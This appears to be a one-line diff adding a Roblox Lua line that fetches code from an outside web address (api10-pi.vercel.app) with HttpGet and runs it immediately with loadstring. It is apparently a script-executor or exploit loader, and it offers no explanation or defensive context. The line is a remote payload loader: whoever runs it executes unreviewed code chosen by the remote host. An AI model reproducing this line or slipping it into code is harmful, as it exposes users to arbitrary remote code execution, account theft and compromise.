@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://api10-pi.vercel.app/api"))()
